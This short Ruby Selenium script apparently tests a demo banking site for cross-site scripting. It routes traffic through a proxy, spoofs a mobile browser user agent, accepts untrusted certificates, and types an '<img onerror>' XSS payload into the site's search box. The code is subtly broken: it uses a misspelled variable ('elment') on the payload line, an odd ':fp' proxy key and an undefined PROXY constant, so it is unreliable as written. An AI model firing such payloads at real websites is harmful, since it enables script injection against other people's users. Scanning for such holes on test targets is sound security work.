#!/usr/bin/env ruby

require 'selenium-webdriver'
require 'net/http'

#profile and tweak set-up
proxy = Selenium::WebDriver::Proxy.new(
  :http => PROXY,
  :fp   => PROXY,
  :ssl  => PROXY
)     #set proxy hostname and port
profile = Selenium::WebDriver::Firefox::Profile.from_name "default"
profile['general.useragent.override'] = "Mozilla/5.0 (compatible; MSIE 9.0; " +
                                         "Android Phone OS 11; Trident/5.0; " +
                                         "IEMobile/9.0)"
profile.proxy = proxy
profile.assume_untrusted_certificate_issuer = false   #accept untrusted SSL certificates

#start Driver
driver = Selenium::WebDriver.for(:firefox, :profile => profile)

#driver = Selenium::WebDriver.for(:firefox, :profile => "default")
driver.manage.window.resize_to(500, 400)
driver.navigate.to "http://www.altoromutual.com/search.aspx?"

#interact with elements
element = driver.find_element(:name, 'txtSearch') #find element named 'txtSearch'
elment.send_keys "<img src=x onerror='alert(1)'>" #send keys to element
element.send_keys(:control, 't')    #open a new tab
element.submit                      #submit text
